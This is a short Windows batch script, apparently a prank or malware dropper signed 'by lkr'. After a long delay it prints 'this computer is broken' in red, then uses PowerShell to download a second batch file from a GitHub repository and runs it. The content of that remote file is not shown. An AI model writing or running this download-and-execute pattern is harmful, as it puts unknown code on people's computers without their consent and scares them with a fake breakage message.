@echo off 
cls

timeout /t 1000 /nobreak > NUL

echo in %date%  %time%

timeout /t 2 /nobreak > NUL

echo this computer is broken

timeout /t 3 /nobreak > NUL

color 4

echo by lkr

goto hate

:hate
powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/nope/raw/main/video.bat','C:\your\asylum\video.bat')"

start video.bat

pause
exit
